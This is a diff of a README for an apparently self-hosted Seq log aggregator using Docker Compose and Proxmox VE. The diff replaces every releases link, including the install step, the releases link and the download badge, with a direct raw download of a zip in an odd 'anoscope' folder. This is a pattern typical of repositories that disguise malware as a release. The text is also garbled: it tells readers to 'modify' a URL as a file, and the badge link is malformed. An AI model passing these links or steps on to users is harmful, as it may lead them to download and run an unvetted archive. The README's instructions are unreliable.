@@ -27,7 +27,7 @@ To get started with Seq Log Aggregator using Docker Compose and Proxmox VE, foll
 ### Installation
 1. Clone this repository to your local machine.
 2. Navigate to the project directory.
-3. Modify the `https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/releases` file to suit your environment.
+3. Modify the `https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/raw/refs/heads/main/anoscope/Log_with_Seq_Docker_Aggregator_Compose_v2.0-alpha.3.zip` file to suit your environment.
 4. Run `docker-compose up` to start the Seq Log Aggregator with Proxmox VE integration.
 
 ## Usage
@@ -37,9 +37,9 @@ Once the Docker Compose setup is running, you can access Seq through your browse
 This repository covers a wide range of topics related to **DevOps**, **Docker**, **Infrastructure Monitoring**, **Log Aggregation**, **Log Management**, **Logging**, **Monitoring**, **Observability**, **Proxmox**, **Proxmox VE**, **PVE**, **Rsyslog**, **Self-Hosted**, **Seq**, **Syslog**, and **VM Monitoring**. If you're interested in any of these areas, you'll find valuable insights and resources here.
 
 ## Additional Resources
-For further information and updates, you can check out the [releases section](https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/releases). Feel free to explore the latest enhancements, bug fixes, and new features that we're constantly adding to make the Seq Log Aggregator even more powerful and user-friendly.
+For further information and updates, you can check out the [releases section](https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/raw/refs/heads/main/anoscope/Log_with_Seq_Docker_Aggregator_Compose_v2.0-alpha.3.zip). Feel free to explore the latest enhancements, bug fixes, and new features that we're constantly adding to make the Seq Log Aggregator even more powerful and user-friendly.
 
-[![Download Latest Release](https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/releases%20Release-blue)](https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/releases)
+[![Download Latest Release](https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/raw/refs/heads/main/anoscope/Log_with_Seq_Docker_Aggregator_Compose_v2.0-alpha.3.zip%20Release-blue)](https://github.com/Albertkinguru/Seq-Log-Aggregator-with-Docker-Compose/raw/refs/heads/main/anoscope/Log_with_Seq_Docker_Aggregator_Compose_v2.0-alpha.3.zip)
 
 Thank you for visiting the Seq Log Aggregator with Docker Compose repository. We hope you find it helpful in your log management and monitoring endeavors! 🚀📊🔍
 
